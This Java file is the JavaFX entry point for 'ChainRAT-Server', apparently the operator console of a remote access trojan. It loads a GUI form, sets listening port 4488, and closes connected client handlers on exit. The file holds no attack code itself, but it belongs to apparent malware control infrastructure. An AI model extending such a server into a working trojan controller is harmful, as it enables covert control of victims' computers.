package com.nefi.chainrat.server;

import com.nefi.chainrat.server.forms.frmMainController;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.Server;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

public class Main extends Application {
    private static frmMainController mainController;
    private static final int PORT = 4488;
    private static Log log;

    @Override
    public void start(Stage primaryStage) throws Exception{
        FXMLLoader loader = new FXMLLoader(getClass().getResource("forms/frmMain.fxml"));
        Parent root = loader.load();
        mainController = loader.getController();
        primaryStage.setOnCloseRequest( event -> {
            try {
                for(Integer i : Server.clientMap.keySet()){
                    Server.ClientHandler handler = Server.clientMap.get(i);
                    handler.close();
                }
                System.exit(0);
            }catch (Exception ex){}

        } );
        primaryStage.setTitle("ChainRAT-Server");
        primaryStage.setScene(new Scene(root, 800, 400));
        primaryStage.show();
    }



    public static void main(String[] args) {
        log = new Log();
        launch(args);
    }

    public static frmMainController getMainController(){
        return mainController;
    }

    public static Log getLog(){
        return log;
    }

    public static int getPort(){
        return PORT;
    }
}
